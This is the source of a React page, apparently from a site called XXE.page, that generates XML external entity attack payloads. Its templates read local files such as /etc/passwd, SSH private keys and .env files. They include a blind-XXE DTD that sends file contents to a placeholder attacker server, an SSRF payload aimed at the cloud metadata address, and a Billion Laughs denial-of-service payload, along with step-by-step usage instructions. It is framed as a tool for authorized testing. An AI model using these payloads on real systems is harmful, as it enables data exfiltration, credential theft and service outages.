import { useState } from 'react'
import Layout from '../components/Layout'
import Sidebar from '../components/Sidebar'
import CodeBlock from '../components/CodeBlock'
import { getNavigation } from '../lib/guideLoader'

export default function PayloadGenerator({ navigation }) {
  // Payload configuration state
  const [payloadType, setPayloadType] = useState('file-disclosure')
  const [platform, setPlatform] = useState('linux')
  const [targetFile, setTargetFile] = useState('/etc/passwd')
  const [callbackUrl, setCallbackUrl] = useState('http://YOUR-SERVER.com/xxe')
  const [protocol, setProtocol] = useState('file')
  const [encoding, setEncoding] = useState('UTF-8')
  const [customEntity, setCustomEntity] = useState('xxe')

  // Payload templates
  const generatePayload = () => {
    switch (payloadType) {
      case 'file-disclosure':
        return generateFileDisclosurePayload()
      case 'blind-xxe':
        return generateBlindXXEPayload()
      case 'ssrf':
        return generateSSRFPayload()
      case 'parameter-entity':
        return generateParameterEntityPayload()
      case 'dos':
        return generateDoSPayload()
      case 'error-based':
        return generateErrorBasedPayload()
      default:
        return generateFileDisclosurePayload()
    }
  }

  const generateFileDisclosurePayload = () => {
    const file = platform === 'windows' ? 'C:/Windows/win.ini' : targetFile
    return `<?xml version="1.0" encoding="${encoding}"?>
<!DOCTYPE root [
  <!ENTITY ${customEntity} SYSTEM "${protocol}://${file}">
]>
<root>
  <data>&${customEntity};</data>
</root>`
  }

  const generateBlindXXEPayload = () => {
    return `<?xml version="1.0" encoding="${encoding}"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "${callbackUrl}/evil.dtd">
  %remote;
]>
<root>
  <data>test</data>
</root>

<!-- evil.dtd contents (host on your server):
<!ENTITY % file SYSTEM "${protocol}://${platform === 'windows' ? 'C:/Windows/win.ini' : targetFile}">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '${callbackUrl}/?data=%file;'>">
%eval;
%exfiltrate;
-->`
  }

  const generateSSRFPayload = () => {
    const defaultTarget = callbackUrl || 'http://169.254.169.254/latest/meta-data/'
    return `<?xml version="1.0" encoding="${encoding}"?>
<!DOCTYPE root [
  <!ENTITY ${customEntity} SYSTEM "${defaultTarget}">
]>
<root>
  <data>&${customEntity};</data>
</root>`
  }

  const generateParameterEntityPayload = () => {
    return `<?xml version="1.0" encoding="${encoding}"?>
<!DOCTYPE root [
  <!ENTITY % dtd SYSTEM "${callbackUrl}/evil.dtd">
  %dtd;
]>
<root>
  <data>test</data>
</root>

<!-- evil.dtd contents (host on your server):
<!ENTITY % file SYSTEM "${protocol}://${platform === 'windows' ? 'C:/Windows/win.ini' : targetFile}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '${callbackUrl}/?x=%file;'>">
%eval;
%exfil;
-->`
  }

  const generateDoSPayload = () => {
    return `<?xml version="1.0" encoding="${encoding}"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<lolz>&lol5;</lolz>

<!-- WARNING: This is a Billion Laughs attack!
     Only use in authorized testing environments.
     Can cause denial of service. -->`
  }

  const generateErrorBasedPayload = () => {
    return `<?xml version="1.0" encoding="${encoding}"?>
<!DOCTYPE root [
  <!ENTITY ${customEntity} SYSTEM "${protocol}://${platform === 'windows' ? 'C:/nonexistent/path/file.txt' : '/nonexistent/path/file.txt'}">
]>
<root>
  <data>&${customEntity};</data>
</root>

<!-- Error-based XXE: Triggers error message that may reveal file paths or system info -->`
  }

  const payload = generatePayload()

  const copyToClipboard = () => {
    navigator.clipboard.writeText(payload)
    alert('Payload copied to clipboard!')
  }

  const downloadPayload = () => {
    const blob = new Blob([payload], { type: 'application/xml' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = `xxe-${payloadType}-${platform}.xml`
    document.body.appendChild(a)
    a.click()
    document.body.removeChild(a)
    URL.revokeObjectURL(url)
  }

  // Common file targets
  const linuxFiles = [
    '/etc/passwd',
    '/etc/hostname',
    '/etc/hosts',
    '/etc/issue',
    '/proc/self/environ',
    '/proc/self/cmdline',
    '~/.ssh/id_rsa',
    '/var/www/html/.env',
  ]

  const windowsFiles = [
    'C:/Windows/win.ini',
    'C:/Windows/System32/drivers/etc/hosts',
    'C:/inetpub/wwwroot/web.config',
    'C:/boot.ini',
  ]

  return (
    <Layout
      title="XXE Payload Generator | XXE.page"
      description="Interactive XXE payload generator for security testing. Generate custom XXE payloads for file disclosure, SSRF, blind XXE, and more."
      showSidebar={true}
      sidebar={<Sidebar navigation={navigation} currentPath="payloads" />}
    >
      <div className="max-w-6xl">
        {/* Header */}
        <header className="mb-8">
          <h1 className="text-4xl font-bold text-gray-900 dark:text-white mb-4">
            XXE Payload Generator
          </h1>
          <p className="text-xl text-gray-600 dark:text-gray-400">
            Interactive tool for generating custom XXE test payloads for authorized security testing
          </p>
          <div className="mt-4 p-4 bg-amber-50 dark:bg-amber-900/20 border-l-4 border-amber-500 rounded">
            <p className="text-sm text-amber-800 dark:text-amber-200">
              <strong>⚠️ Warning:</strong> Only use these payloads in authorized security testing environments.
              Unauthorized testing is illegal and unethical.
            </p>
          </div>
        </header>

        {/* Configuration Panel */}
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8 mb-8">
          {/* Left Column - Configuration */}
          <div className="lg:col-span-1 space-y-6">
            {/* Payload Type */}
            <div className="bg-white dark:bg-gray-800 rounded-lg p-6 shadow-lg">
              <h2 className="text-xl font-bold text-gray-900 dark:text-white mb-4">
                Payload Type
              </h2>

              <div className="space-y-3">
                {[
                  { value: 'file-disclosure', label: 'File Disclosure', desc: 'Read local files' },
                  { value: 'blind-xxe', label: 'Blind XXE', desc: 'Out-of-band exfiltration' },
                  { value: 'ssrf', label: 'SSRF', desc: 'Server-side request forgery' },
                  { value: 'parameter-entity', label: 'Parameter Entity', desc: 'Advanced blind XXE' },
                  { value: 'error-based', label: 'Error-Based', desc: 'Trigger error messages' },
                  { value: 'dos', label: 'Billion Laughs', desc: 'Denial of service' },
                ].map(({ value, label, desc }) => (
                  <label key={value} className="flex items-start cursor-pointer">
                    <input
                      type="radio"
                      name="payloadType"
                      value={value}
                      checked={payloadType === value}
                      onChange={(e) => setPayloadType(e.target.value)}
                      className="mt-1 mr-3"
                    />
                    <div>
                      <div className="font-medium text-gray-900 dark:text-white">{label}</div>
                      <div className="text-sm text-gray-600 dark:text-gray-400">{desc}</div>
                    </div>
                  </label>
                ))}
              </div>
            </div>

            {/* Platform */}
            <div className="bg-white dark:bg-gray-800 rounded-lg p-6 shadow-lg">
              <h2 className="text-xl font-bold text-gray-900 dark:text-white mb-4">
                Target Platform
              </h2>

              <div className="space-y-3">
                <label className="flex items-center cursor-pointer">
                  <input
                    type="radio"
                    name="platform"
                    value="linux"
                    checked={platform === 'linux'}
                    onChange={(e) => setPlatform(e.target.value)}
                    className="mr-3"
                  />
                  <span className="text-gray-900 dark:text-white">Linux / Unix</span>
                </label>
                <label className="flex items-center cursor-pointer">
                  <input
                    type="radio"
                    name="platform"
                    value="windows"
                    checked={platform === 'windows'}
                    onChange={(e) => setPlatform(e.target.value)}
                    className="mr-3"
                  />
                  <span className="text-gray-900 dark:text-white">Windows</span>
                </label>
              </div>
            </div>

            {/* Configuration Options */}
            <div className="bg-white dark:bg-gray-800 rounded-lg p-6 shadow-lg">
              <h2 className="text-xl font-bold text-gray-900 dark:text-white mb-4">
                Configuration
              </h2>

              <div className="space-y-4">
                {/* Target File */}
                {(payloadType === 'file-disclosure' || payloadType === 'error-based') && (
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                      Target File
                    </label>
                    {platform === 'linux' ? (
                      <select
                        value={targetFile}
                        onChange={(e) => setTargetFile(e.target.value)}
                        className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-lg bg-white dark:bg-gray-700 text-gray-900 dark:text-white"
                      >
                        {linuxFiles.map(file => (
                          <option key={file} value={file}>{file}</option>
                        ))}
                      </select>
                    ) : (
                      <select
                        value={targetFile}
                        onChange={(e) => setTargetFile(e.target.value)}
                        className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-lg bg-white dark:bg-gray-700 text-gray-900 dark:text-white"
                      >
                        {windowsFiles.map(file => (
                          <option key={file} value={file}>{file}</option>
                        ))}
                      </select>
                    )}
                    <input
                      type="text"
                      value={targetFile}
                      onChange={(e) => setTargetFile(e.target.value)}
                      placeholder="/etc/passwd"
                      className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-lg bg-white dark:bg-gray-700 text-gray-900 dark:text-white mt-2"
                    />
                  </div>
                )}

                {/* Callback URL */}
                {(payloadType === 'blind-xxe' || payloadType === 'parameter-entity' || payloadType === 'ssrf') && (
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                      {payloadType === 'ssrf' ? 'SSRF Target URL' : 'Callback URL'}
                    </label>
                    <input
                      type="text"
                      value={callbackUrl}
                      onChange={(e) => setCallbackUrl(e.target.value)}
                      placeholder="http://YOUR-SERVER.com/xxe"
                      className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-lg bg-white dark:bg-gray-700 text-gray-900 dark:text-white"
                    />
                    <p className="text-xs text-gray-600 dark:text-gray-400 mt-1">
                      {payloadType === 'ssrf' ? 'Internal service or cloud metadata URL' : 'Your server or Burp Collaborator domain'}
                    </p>
                  </div>
                )}

                {/* Protocol */}
                {payloadType === 'file-disclosure' && (
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                      Protocol
                    </label>
                    <select
                      value={protocol}
                      onChange={(e) => setProtocol(e.target.value)}
                      className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-lg bg-white dark:bg-gray-700 text-gray-900 dark:text-white"
                    >
                      <option value="file">file://</option>
                      <option value="php">php:// (PHP only)</option>
                      <option value="expect">expect:// (PHP with expect ext)</option>
                    </select>
                  </div>
                )}

                {/* Entity Name */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                    Entity Name
                  </label>
                  <input
                    type="text"
                    value={customEntity}
                    onChange={(e) => setCustomEntity(e.target.value)}
                    placeholder="xxe"
                    className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-lg bg-white dark:bg-gray-700 text-gray-900 dark:text-white"
                  />
                </div>

                {/* Encoding */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                    Encoding
                  </label>
                  <select
                    value={encoding}
                    onChange={(e) => setEncoding(e.target.value)}
                    className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-lg bg-white dark:bg-gray-700 text-gray-900 dark:text-white"
                  >
                    <option value="UTF-8">UTF-8</option>
                    <option value="UTF-16">UTF-16</option>
                    <option value="ISO-8859-1">ISO-8859-1</option>
                  </select>
                </div>
              </div>
            </div>
          </div>

          {/* Right Column - Generated Payload */}
          <div className="lg:col-span-2">
            <div className="bg-white dark:bg-gray-800 rounded-lg p-6 shadow-lg">
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-xl font-bold text-gray-900 dark:text-white">
                  Generated Payload
                </h2>
                <div className="flex gap-2">
                  <button
                    onClick={copyToClipboard}
                    className="px-4 py-2 bg-primary-600 hover:bg-primary-700 text-white rounded-lg transition-colors flex items-center gap-2"
                  >
                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                    </svg>
                    Copy
                  </button>
                  <button
                    onClick={downloadPayload}
                    className="px-4 py-2 bg-green-600 hover:bg-green-700 text-white rounded-lg transition-colors flex items-center gap-2"
                  >
                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
                    </svg>
                    Download
                  </button>
                </div>
              </div>

              <CodeBlock
                code={payload}
                language="xml"
                isVulnerable={true}
                filename={`xxe-${payloadType}-${platform}.xml`}
              />

              {/* Usage Instructions */}
              <div className="mt-6 p-4 bg-blue-50 dark:bg-blue-900/20 border-l-4 border-blue-500 rounded">
                <h3 className="font-bold text-blue-900 dark:text-blue-200 mb-2">Usage Instructions:</h3>
                <ul className="text-sm text-blue-800 dark:text-blue-300 space-y-1 list-disc list-inside">
                  {payloadType === 'file-disclosure' && (
                    <>
                      <li>Send this XML to the target application endpoint</li>
                      <li>Check the response for file contents</li>
                      <li>If no output, try error-based or blind XXE techniques</li>
                    </>
                  )}
                  {payloadType === 'blind-xxe' && (
                    <>
                      <li>Host evil.dtd file on your server at the specified URL</li>
                      <li>Send the payload to the target application</li>
                      <li>Monitor your server logs for incoming HTTP requests</li>
                      <li>File contents will be in the query string parameter</li>
                    </>
                  )}
                  {payloadType === 'ssrf' && (
                    <>
                      <li>Target internal services or cloud metadata endpoints</li>
                      <li>Common targets: http://localhost:8080, http://169.254.169.254</li>
                      <li>Check response for internal service data</li>
                    </>
                  )}
                  {payloadType === 'parameter-entity' && (
                    <>
                      <li>Host evil.dtd on your server</li>
                      <li>Submit payload to target</li>
                      <li>Monitor server for callbacks with exfiltrated data</li>
                    </>
                  )}
                  {payloadType === 'dos' && (
                    <>
                      <li><strong>⚠️ WARNING:</strong> Only use in authorized testing!</li>
                      <li>This payload can cause denial of service</li>
                      <li>Test in isolated, non-production environment only</li>
                      <li>May crash the XML parser or consume excessive memory</li>
                    </>
                  )}
                  {payloadType === 'error-based' && (
                    <>
                      <li>Reference a non-existent file to trigger errors</li>
                      <li>Check error messages for file paths or system info</li>
                      <li>Error messages may reveal parser details</li>
                    </>
                  )}
                </ul>
              </div>
            </div>
          </div>
        </div>

        {/* Quick Reference */}
        <div className="bg-white dark:bg-gray-800 rounded-lg p-6 shadow-lg">
          <h2 className="text-2xl font-bold text-gray-900 dark:text-white mb-4">
            Quick Reference
          </h2>

          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
            <div className="p-4 bg-gray-50 dark:bg-gray-700 rounded-lg">
              <h3 className="font-bold text-gray-900 dark:text-white mb-2">Common Linux Targets</h3>
              <ul className="text-sm text-gray-700 dark:text-gray-300 space-y-1">
                <li><code>/etc/passwd</code> - User accounts</li>
                <li><code>/etc/shadow</code> - Password hashes</li>
                <li><code>/proc/self/environ</code> - Environment vars</li>
                <li><code>~/.ssh/id_rsa</code> - SSH keys</li>
              </ul>
            </div>

            <div className="p-4 bg-gray-50 dark:bg-gray-700 rounded-lg">
              <h3 className="font-bold text-gray-900 dark:text-white mb-2">Common Windows Targets</h3>
              <ul className="text-sm text-gray-700 dark:text-gray-300 space-y-1">
                <li><code>C:/Windows/win.ini</code> - Windows config</li>
                <li><code>C:/boot.ini</code> - Boot config</li>
                <li><code>C:/inetpub/wwwroot/web.config</code> - IIS</li>
              </ul>
            </div>

            <div className="p-4 bg-gray-50 dark:bg-gray-700 rounded-lg">
              <h3 className="font-bold text-gray-900 dark:text-white mb-2">SSRF Targets</h3>
              <ul className="text-sm text-gray-700 dark:text-gray-300 space-y-1">
                <li><code>http://localhost:8080</code> - Local services</li>
                <li><code>http://169.254.169.254</code> - Cloud metadata</li>
                <li><code>http://192.168.1.1</code> - Internal network</li>
              </ul>
            </div>
          </div>
        </div>

        {/* Testing Resources */}
        <div className="mt-8 bg-gray-50 dark:bg-gray-800 rounded-lg p-6">
          <h2 className="text-xl font-bold text-gray-900 dark:text-white mb-4">
            Testing Resources
          </h2>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
              <h3 className="font-semibold text-gray-900 dark:text-white mb-2">OOB Detection Services</h3>
              <ul className="text-sm text-gray-700 dark:text-gray-300 space-y-1">
                <li>• <a href="https://portswigger.net/burp/documentation/desktop/tools/collaborator" target="_blank" rel="noopener noreferrer" className="text-primary-600 hover:underline">Burp Collaborator</a> (Burp Suite Pro)</li>
                <li>• <a href="https://app.interactsh.com" target="_blank" rel="noopener noreferrer" className="text-primary-600 hover:underline">Interactsh</a> (Free)</li>
              </ul>
            </div>
            <div>
              <h3 className="font-semibold text-gray-900 dark:text-white mb-2">Related Guides</h3>
              <ul className="text-sm text-gray-700 dark:text-gray-300 space-y-1">
                <li>• <a href="/guide/testing/methodology" className="text-primary-600 hover:underline">Testing Methodology</a></li>
                <li>• <a href="/guide/payload/design" className="text-primary-600 hover:underline">Payload Design</a></li>
                <li>• <a href="/guide/testing/tools" className="text-primary-600 hover:underline">Testing Tools</a></li>
              </ul>
            </div>
          </div>
        </div>
      </div>
    </Layout>
  )
}

export async function getStaticProps() {
  const navigation = getNavigation()

  return {
    props: {
      navigation,
    },
  }
}
